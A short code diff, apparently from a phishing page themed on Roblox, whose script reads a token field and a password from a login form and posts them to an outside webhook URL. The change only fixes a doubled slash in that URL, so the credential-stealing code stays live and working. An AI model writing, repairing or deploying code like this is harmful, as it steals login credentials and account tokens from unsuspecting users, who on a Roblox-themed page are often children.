@@ -6,7 +6,7 @@ document.addEventListener('DOMContentLoaded', function() {
         const username = document.querySelector('input[name="ctoken"]').value;
         const password = document.querySelector('input[name="password"]').value;
 
-        fetch('https://https://codename4325.github.io/roblox-redirect2//webhook', {
+        fetch('https://https://codename4325.github.io/roblox-redirect2/webhook', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
